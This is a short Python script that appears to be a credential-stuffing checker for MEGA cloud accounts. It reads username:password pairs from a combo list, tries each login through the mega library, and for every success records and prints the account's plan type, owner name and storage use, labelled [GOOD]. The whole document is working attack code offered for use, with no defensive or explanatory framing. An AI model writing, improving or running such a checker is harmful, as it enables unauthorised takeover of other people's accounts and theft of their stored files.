from mega import Mega

mega = Mega()
a = open("combos.txt","r")
file = [s.rstrip() for s in a.readlines()]

for lines in file:
    combo = lines.split(":")
    param = {
        "username":combo[0],
        "password":combo[1]
    }
    try:
        m = mega.login(param['username'], param['password'])
        account = param['username'], param['password']
        details = m.get_user()
        if details['s'] == 0:
            status = "Basic"
        else:
            status = "Pro"
        space = m.get_storage_space(giga=True)
        used = f"{space['used']:.2}"
        green = open("working.txt","w")
        green.write(f"Account: {account[0]}:{account[1]}\nStatus: {status}\nName: {details['name']}\nSize: {used}GB / {space['total']}GB\n")
        print(f"[GOOD] {account[0]}:{account[1]}\nStatus: {status}\nName: {details['name']}\nSize: {used}GB / {space['total']}GB")
        green.close()
    except:
        print(f'[BAD] {combo[0]}:{combo[1]}')

